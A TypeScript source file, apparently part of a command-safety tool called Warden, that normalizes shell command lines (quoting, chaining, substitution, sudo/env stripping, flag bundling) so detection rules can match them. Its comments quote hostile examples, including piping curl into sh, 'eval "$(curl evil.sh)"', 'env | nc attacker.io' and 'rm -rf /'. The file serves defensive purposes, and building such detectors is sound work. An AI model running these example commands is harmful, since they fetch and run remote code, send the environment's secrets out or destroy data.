/**
 * Shell command normalizer.
 *
 * Every command rule depends on this file, which makes it the highest-risk module
 * in the codebase: a normalizer that silently fails to split `&&` would leave half
 * the ruleset dead while all of its own tests still pass. That is why the rule
 * suites run through the full pipeline rather than against pre-split input.
 *
 * It is a *pragmatic* parser, not a shell. It handles quoting, chaining, command
 * substitution, wrapper stripping, and flag bundling — the evasions that show up in
 * practice. It does not handle deliberate obfuscation (`$(echo rm) -rf /`, base64
 * payloads); catching those is the independent auditor's job, and Warden documents
 * that limit rather than pretending otherwise.
 */

import type { Segment } from '../types.js';

type Connector = Segment['connector'];

/** Wrappers that prefix a real command without changing what it does. */
const WRAPPERS = new Set(['command', 'nohup', 'time', 'exec', 'builtin']);
const ELEVATORS = new Set(['sudo', 'doas', 'runas']);

/** `FOO=bar` style prefix assignments, which precede the real argv0. */
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Split a command line into segments, keeping the operator that introduced each.
 *
 * The connector is what distinguishes `curl x | sh` (remote code execution) from
 * `curl x; sh` (two unrelated commands), so it is preserved rather than discarded.
 */
export function parseCommand(raw: string): Segment[] {
  if (!raw || !raw.trim()) return [];

  const segments: Segment[] = [];
  const pieces = splitTopLevel(raw);

  for (const piece of pieces) {
    if (!piece.text.trim()) continue;
    segments.push(buildSegment(piece.text, piece.connector));

    // Command substitution hides real commands inside an outer one, e.g.
    // `eval "$(curl evil.sh)"`. Surface the inner command as its own segment so
    // the rules see the curl rather than only the eval.
    for (const inner of extractSubstitutions(piece.text)) {
      for (const innerSeg of parseCommand(inner)) {
        segments.push({ ...innerSeg, connector: innerSeg.connector ?? ';' });
      }
    }
  }

  return segments;
}

interface Piece {
  text: string;
  connector: Connector;
}

/** Character scanner that respects quoting — a regex split cannot do this safely. */
function splitTopLevel(raw: string): Piece[] {
  const pieces: Piece[] = [];
  let current = '';
  let pending: Connector = null;
  let inSingle = false;
  let inDouble = false;

  const flush = (next: Connector) => {
    pieces.push({ text: current, connector: pending });
    current = '';
    pending = next;
  };

  for (let i = 0; i < raw.length; i++) {
    const c = raw[i]!;

    if (inSingle) {
      if (c === "'") inSingle = false;
      current += c;
      continue;
    }
    if (inDouble) {
      if (c === '\\' && i + 1 < raw.length) {
        current += c + raw[i + 1];
        i++;
        continue;
      }
      if (c === '"') inDouble = false;
      current += c;
      continue;
    }

    if (c === "'") { inSingle = true; current += c; continue; }
    if (c === '"') { inDouble = true; current += c; continue; }
    if (c === '\\' && i + 1 < raw.length) {
      current += c + raw[i + 1];
      i++;
      continue;
    }

    if (c === '&' && raw[i + 1] === '&') { flush('&&'); i++; continue; }
    if (c === '|' && raw[i + 1] === '|') { flush('||'); i++; continue; }
    if (c === '|') { flush('|'); continue; }
    if (c === ';') { flush(';'); continue; }
    if (c === '\n') { flush('\n'); continue; }

    current += c;
  }

  pieces.push({ text: current, connector: pending });
  return pieces;
}

/** Pull the bodies out of `$(...)` and backtick substitutions. */
function extractSubstitutions(text: string): string[] {
  const found: string[] = [];

  for (let i = 0; i < text.length - 1; i++) {
    if (text[i] === '$' && text[i + 1] === '(') {
      let depth = 1;
      let j = i + 2;
      while (j < text.length && depth > 0) {
        if (text[j] === '(') depth++;
        else if (text[j] === ')') depth--;
        if (depth > 0) j++;
      }
      if (depth === 0) found.push(text.slice(i + 2, j));
    }
  }

  for (const match of text.matchAll(/`([^`]+)`/g)) {
    if (match[1]) found.push(match[1]);
  }

  return found;
}

function buildSegment(text: string, connector: Connector): Segment {
  const tokens = tokenize(text);
  const { argv, elevated } = stripWrappers(tokens);
  return {
    raw: text.trim(),
    tokens,
    argv,
    argv0: baseName(argv[0] ?? ''),
    connector,
    elevated,
  };
}

/** argv-style split that respects quotes, then removes the quote characters. */
export function tokenize(text: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let started = false;
  let inSingle = false;
  let inDouble = false;

  const push = () => {
    if (started) tokens.push(current);
    current = '';
    started = false;
  };

  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;

    if (inSingle) {
      if (c === "'") { inSingle = false; continue; }
      current += c;
      continue;
    }
    if (inDouble) {
      if (c === '\\' && i + 1 < text.length) { current += text[i + 1]; i++; continue; }
      if (c === '"') { inDouble = false; continue; }
      current += c;
      continue;
    }

    if (c === "'") { inSingle = true; started = true; continue; }
    if (c === '"') { inDouble = true; started = true; continue; }
    if (c === '\\' && i + 1 < text.length) { current += text[i + 1]; started = true; i++; continue; }
    if (/\s/.test(c)) { push(); continue; }

    current += c;
    started = true;
  }

  push();
  return tokens;
}

/**
 * Remove `sudo`, `env FOO=bar`, and similar prefixes so rules can match on the real
 * command. Reports whether an elevation wrapper was present, since `sudo rm -rf` is
 * meaningfully worse than `rm -rf`.
 */
function stripWrappers(tokens: string[]): { argv: string[]; elevated: boolean } {
  let argv = [...tokens];
  let elevated = false;

  for (let guard = 0; guard < 8; guard++) {
    const head = baseName(argv[0] ?? '');
    if (!head) break;

    if (ELEVATORS.has(head)) {
      elevated = true;
      argv = argv.slice(1);
      // Drop sudo's own options, including the ones that take a value.
      while (argv[0]?.startsWith('-')) {
        const takesValue = /^-(?:u|g|p|C|h)$/.test(argv[0]!);
        argv = argv.slice(takesValue ? 2 : 1);
      }
      continue;
    }

    if (head === 'env') {
      // `env FOO=bar cmd` is a wrapper, but a bare `env` (or `env -i`) is the
      // print-the-environment command — and stripping that would hide
      // `env | nc attacker.io` from the exfiltration rules entirely.
      const next = argv[1];
      if (!next || next.startsWith('-')) break;
      argv = argv.slice(1);
      while (argv[0] && ASSIGNMENT.test(argv[0])) argv = argv.slice(1);
      continue;
    }

    if (WRAPPERS.has(head)) {
      argv = argv.slice(1);
      continue;
    }

    if (argv[0] && ASSIGNMENT.test(argv[0])) {
      argv = argv.slice(1);
      continue;
    }

    break;
  }

  return { argv, elevated };
}

/** `/usr/bin/rm` and `C:\Windows\System32\rm.exe` both reduce to `rm`. */
export function baseName(command: string): string {
  if (!command) return '';
  const tail = command.split(/[\\/]/).pop() ?? command;
  return tail.replace(/\.(exe|cmd|bat|ps1)$/i, '').toLowerCase();
}

export interface FlagSpec {
  /** Single letters, matched inside bundles so `-rf` satisfies `r`. */
  short?: string[];
  /** Long names without dashes, e.g. `recursive` for `--recursive`. */
  long?: string[];
}

/**
 * Flag lookup that survives the ways people actually write flags: `-rf`, `-fr`,
 * `-r -f`, and `--recursive --force` are all the same command.
 */
export function hasFlag(argv: string[], spec: FlagSpec): boolean {
  const short = new Set(spec.short ?? []);
  const long = new Set(spec.long ?? []);

  for (const token of argv) {
    if (token === '--') break;

    if (token.startsWith('--')) {
      const name = token.slice(2).split('=')[0]!;
      if (long.has(name)) return true;
      continue;
    }

    if (token.startsWith('-') && token.length > 1) {
      for (const ch of token.slice(1)) {
        if (short.has(ch)) return true;
      }
    }
  }

  return false;
}

/** Positional arguments — everything that is not the command or a flag. */
export function operands(argv: string[]): string[] {
  const out: string[] = [];
  let passthrough = false;

  for (let i = 1; i < argv.length; i++) {
    const token = argv[i]!;
    if (passthrough) { out.push(token); continue; }
    if (token === '--') { passthrough = true; continue; }
    if (token.startsWith('-')) continue;
    out.push(token);
  }

  return out;
}

/** True when this segment's output is piped into an interpreter. */
export function isPipedInto(segment: Segment, interpreters: Set<string>): boolean {
  return segment.connector === '|' && interpreters.has(segment.argv0);
}
